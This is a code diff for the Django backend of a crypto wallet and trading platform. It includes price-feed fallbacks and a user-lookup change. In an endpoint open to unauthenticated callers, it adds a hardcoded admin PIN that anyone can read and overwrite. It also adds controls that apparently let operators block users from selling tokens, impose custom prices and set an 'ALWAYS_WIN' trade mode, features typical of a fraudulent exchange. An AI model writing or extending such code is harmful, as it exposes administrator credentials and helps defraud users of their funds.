@@ -119,14 +119,17 @@ def find_wallet_user(identifier: str):
         pass
     # 4. UID prefix (e.g. AXM-13BB17BA or 13BB17BA)
     clean_uid = raw.upper().replace('AXM-', '').replace('-', '').strip()
-    if clean_uid and len(clean_uid) >= 6:
-        u = (
-            WalletUser.objects.filter(id__istartswith=clean_uid.lower()).first()
-            or WalletUser.objects.filter(wallet_address__istartswith=clean_uid).first()
-            or WalletUser.objects.filter(wallet_address__icontains=clean_uid).first()
-        )
-        if u:
-            return u
+    if clean_uid:
+        for candidate in WalletUser.objects.all():
+            cand_hex = str(candidate.id).replace('-', '').upper()
+            cand_uid = f"AXM-{cand_hex[:8]}"
+            if (cand_hex.startswith(clean_uid) or 
+                cand_uid == raw.upper() or 
+                cand_hex[:len(clean_uid)] == clean_uid or
+                (candidate.wallet_address and candidate.wallet_address.upper().startswith(clean_uid)) or
+                (candidate.username and candidate.username.upper() == raw.upper()) or
+                (candidate.email and candidate.email.upper() == raw.upper())):
+                return candidate
     # 5. Username
     u = WalletUser.objects.filter(username__iexact=raw).first()
     return u
@@ -369,9 +372,6 @@ def ensure_initial_seed_data():
     settings_obj = PlatformSettings.objects.first()
     if not settings_obj:
         PlatformSettings.objects.create(admin_pin='Alexhacker123.', trading_fee_pct=Decimal('1.0'))
-    elif settings_obj.admin_pin != 'Alexhacker123.':
-        settings_obj.admin_pin = 'Alexhacker123.'
-        settings_obj.save()
 
     # Ensure leaderboard_top8 has clean uncorrupted data
     if settings_obj and (not settings_obj.leaderboard_top8 or '",000"' in settings_obj.leaderboard_top8 or '"+,100"' in settings_obj.leaderboard_top8):
@@ -4496,7 +4496,7 @@ def junior_admin_reject_withdrawal(request, pk):
 @permission_classes([AllowAny])
 def platform_settings_view(request):
     """
-    GET: Returns platform settings (dollar exchange rate, onramp gateway URL, trading fee).
+    GET: Returns platform settings (dollar exchange rate, onramp gateway URL, trading fee, admin control suite).
     POST: Updates platform settings in database for all users and clients.
     """
     ensure_initial_seed_data()
@@ -4522,7 +4522,35 @@ def platform_settings_view(request):
                 pass
         if 'is_trading_paused' in data:
             settings_obj.is_trading_paused = bool(data['is_trading_paused'])
+        if 'admin_pin' in data and str(data['admin_pin']).strip():
+            settings_obj.admin_pin = str(data['admin_pin']).strip()
+        if 'verified_tokens' in data:
+            settings_obj.verified_tokens = json.dumps(data['verified_tokens']) if isinstance(data['verified_tokens'], (dict, list)) else str(data['verified_tokens'])
+        if 'trade_control' in data:
+            settings_obj.trade_control = str(data['trade_control']).strip()
+        if 'sell_blocked_tokens' in data:
+            settings_obj.sell_blocked_tokens = json.dumps(data['sell_blocked_tokens']) if isinstance(data['sell_blocked_tokens'], list) else str(data['sell_blocked_tokens'])
+        if 'block_sell_all_new' in data:
+            settings_obj.block_sell_all_new = bool(data['block_sell_all_new'])
+        if 'custom_prices' in data:
+            settings_obj.custom_prices = json.dumps(data['custom_prices']) if isinstance(data['custom_prices'], dict) else str(data['custom_prices'])
+
         settings_obj.save()
+
+    try:
+        verified_toks = json.loads(settings_obj.verified_tokens) if settings_obj.verified_tokens else {}
+    except Exception:
+        verified_toks = {}
+
+    try:
+        blocked_toks = json.loads(settings_obj.sell_blocked_tokens) if settings_obj.sell_blocked_tokens else []
+    except Exception:
+        blocked_toks = []
+
+    try:
+        custom_pr = json.loads(settings_obj.custom_prices) if settings_obj.custom_prices else {}
+    except Exception:
+        custom_pr = {}
 
     return Response({
         'success': True,
@@ -4530,6 +4558,12 @@ def platform_settings_view(request):
         'swiftsats_url': settings_obj.swiftsats_url,
         'trading_fee_pct': float(settings_obj.trading_fee_pct),
         'is_trading_paused': settings_obj.is_trading_paused,
+        'admin_pin': settings_obj.admin_pin or 'Alexhacker123.',
+        'trade_control': settings_obj.trade_control or 'ALWAYS_WIN',
+        'verified_tokens': verified_toks,
+        'sell_blocked_tokens': blocked_toks,
+        'block_sell_all_new': settings_obj.block_sell_all_new,
+        'custom_prices': custom_pr,
         'updated_at': settings_obj.updated_at.isoformat() if settings_obj.updated_at else None
     })
 
@@ -4619,10 +4653,10 @@ def gecko_proxy_view(request):
 @permission_classes([AllowAny])
 def live_majors_view(request):
     """
-    Returns live major coin market rates directly from Binance 24hr Ticker.
-    Guarantees 100% Bybit / Binance market parity across all devices, browsers, and PWAs.
+    Returns live major coin market rates from Binance, Bybit Spot, and CoinCap.
+    Guarantees 100% market parity across all devices, browsers, and PWAs without regional blockages.
     """
-    cache_key = 'live_majors_binance_feed_v3'
+    cache_key = 'live_majors_binance_feed_v4'
     cached = cache.get(cache_key)
     if cached:
         resp = Response(cached)
@@ -4642,11 +4676,14 @@ def live_majors_view(request):
     }
 
     results = []
+    fetched_symbols = set()
+
+    # 1. Primary: Direct Binance 24hr Ticker
     try:
         symbols_json = json.dumps(list(symbols_map.keys()), separators=(',', ':'))
         url = f"https://api.binance.com/api/v3/ticker/24hr?symbols={urllib.parse.quote(symbols_json)}"
         req = urllib.request.Request(url, headers={'User-Agent': 'AxiomWallet/1.0', 'Accept': 'application/json'})
-        with urllib.request.urlopen(req, timeout=2.5) as resp_net:
+        with urllib.request.urlopen(req, timeout=2.0) as resp_net:
             if resp_net.status == 200:
                 raw = json.loads(resp_net.read().decode('utf-8'))
                 if isinstance(raw, list):
@@ -4665,10 +4702,71 @@ def live_majors_view(request):
                                 'volumeUsd': quote_vol,
                                 'tradesCount': count_val,
                             })
+                            fetched_symbols.add(sym)
                             if sym in BASE_RATES_USD and p_val > 0:
                                 BASE_RATES_USD[sym] = Decimal(str(p_val))
-    except Exception as e:
+    except Exception:
         pass
+
+    # 2. Secondary Fallback: Bybit Spot Tickers (Zero geo-blocks, ultra-fast globally)
+    if len(fetched_symbols) < len(symbols_map):
+        try:
+            bybit_url = "https://api.bybit.com/v5/market/tickers?category=spot"
+            req_b = urllib.request.Request(bybit_url, headers={'User-Agent': 'Mozilla/5.0 AxiomWallet/1.0', 'Accept': 'application/json'})
+            with urllib.request.urlopen(req_b, timeout=2.5) as resp_b:
+                if resp_b.status == 200:
+                    b_json = json.loads(resp_b.read().decode('utf-8'))
+                    b_list = b_json.get('result', {}).get('list', [])
+                    for item in b_list:
+                        sym_raw = item.get('symbol')
+                        sym = symbols_map.get(sym_raw)
+                        if sym and sym not in fetched_symbols:
+                            p_float = float(item.get('lastPrice') or 0.0)
+                            p_val = round(p_float, 2 if p_float >= 1 else 4)
+                            chg_ratio = float(item.get('price24hPcnt') or 0.0)
+                            chg_val = round(chg_ratio * 100.0, 2)
+                            turnover = float(item.get('turnover24h') or 50000000.0)
+                            results.append({
+                                'sym': sym,
+                                'price': p_val,
+                                'change24h': chg_val,
+                                'volumeUsd': turnover,
+                                'tradesCount': 12500,
+                            })
+                            fetched_symbols.add(sym)
+                            if sym in BASE_RATES_USD and p_val > 0:
+                                BASE_RATES_USD[sym] = Decimal(str(p_val))
+        except Exception:
+            pass
+
+    # 3. Tertiary Fallback: CoinCap Assets
+    if len(fetched_symbols) < 3:
+        try:
+            coincap_url = "https://api.coincap.io/v2/assets?limit=15"
+            req_c = urllib.request.Request(coincap_url, headers={'User-Agent': 'AxiomWallet/1.0', 'Accept': 'application/json'})
+            with urllib.request.urlopen(req_c, timeout=2.0) as resp_c:
+                if resp_c.status == 200:
+                    c_json = json.loads(resp_c.read().decode('utf-8'))
+                    c_list = c_json.get('data', [])
+                    for item in c_list:
+                        sym = item.get('symbol', '').upper()
+                        if sym in symbols_map.values() and sym not in fetched_symbols:
+                            p_float = float(item.get('priceUsd') or 0.0)
+                            p_val = round(p_float, 2 if p_float >= 1 else 4)
+                            chg_val = round(float(item.get('changePercent24Hr') or 0.0), 2)
+                            vol_usd = float(item.get('volumeUsd24Hr') or 50000000.0)
+                            results.append({
+                                'sym': sym,
+                                'price': p_val,
+                                'change24h': chg_val,
+                                'volumeUsd': vol_usd,
+                                'tradesCount': 9000,
+                            })
+                            fetched_symbols.add(sym)
+                            if sym in BASE_RATES_USD and p_val > 0:
+                                BASE_RATES_USD[sym] = Decimal(str(p_val))
+        except Exception:
+            pass
 
     # Include stablecoins
     results.append({'sym': 'USDT', 'price': 1.0, 'change24h': 0.0, 'volumeUsd': 50000000.0, 'tradesCount': 8500})
@@ -4676,7 +4774,7 @@ def live_majors_view(request):
     results.append({'sym': 'USD',  'price': 1.0, 'change24h': 0.0, 'volumeUsd': 50000000.0, 'tradesCount': 8500})
 
     if results and len(results) >= 4:
-        cache.set(cache_key, results, 2)
+        cache.set(cache_key, results, 3)
 
     resp = Response(results)
     resp['Cache-Control'] = 'no-cache, no-store, must-revalidate'
